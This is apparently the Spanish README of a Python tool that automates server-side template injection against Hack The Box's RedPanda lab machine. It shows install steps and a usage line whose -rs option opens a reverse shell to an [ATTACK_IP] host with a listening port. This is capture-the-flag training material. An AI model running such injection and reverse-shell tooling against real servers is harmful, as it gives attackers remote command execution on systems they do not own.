## ssti_attack_redpanda
SSTI ATTACK REDPANDA, es un script programado en python diseñado especificamente para la maquina RedPanda de Hack The Box.
Realizando peticiones por POST al servidor, hace la injeccion del template con el comando que se haya especificado.
***
## Instalacion
```
git clone https://github.com/kr4ken600/ssti_attack_redpanda.git ssti
cd ssti
pip install -r requirements.txt
```
***
## Uso
El script contiene una opcion de ayuda:
```
python3 ssti_attack_redpanda.py -h
```
En el que se desplegara la forma de usarse y sus diferentes opciones.
### Crear una Reverse Shell
Entre las opciones se encuentra ```-rs```, el cual crea una reverse shell de forma automatica, solo se necesitan 3 parametros más:
```
python3 ssti_attack_redpanda.py -rs [ATTACK_IP] [HTTP_PORT] [PORT]
```
Tambien es necesatio tener corriendo un servicio http y estar en escucha por el puerto decesado para entablar la reverse shell
## Ejemplo
![Image Text](/img/image.png)
